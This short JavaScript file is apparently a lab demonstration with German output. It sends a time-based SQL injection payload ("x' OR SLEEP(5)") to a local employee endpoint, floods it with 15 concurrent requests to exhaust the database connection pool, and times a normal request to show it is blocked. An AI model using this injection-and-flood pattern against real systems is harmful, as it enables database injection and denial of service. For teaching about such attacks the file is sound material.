const BASE = 'http://localhost:3000';

async function main() {
    // makes the query lag and blocks other requests
    //
    const payload = "x' OR SLEEP(5)-- -";
    const url = `${BASE}/employee?first_name=${encodeURIComponent(payload)}`;

    console.log('--- Angriff: Verfügbarkeit (DoS via Pool-Exhaustion) ---');
    console.log('15 gleichzeitige Anfragen');
    const flood = [];
    for (let i = 0; i < 15; i++) flood.push(fetch(url));

    // A nomral request gets blocked
    const start = Date.now();
    await fetch(`${BASE}/employee?first_name=Anna`);
    console.log(`Normale Anfrage brauchte ${(Date.now() - start) / 1000}s — blockiert durch den Angriff.`);

    await Promise.all(flood);
}

main();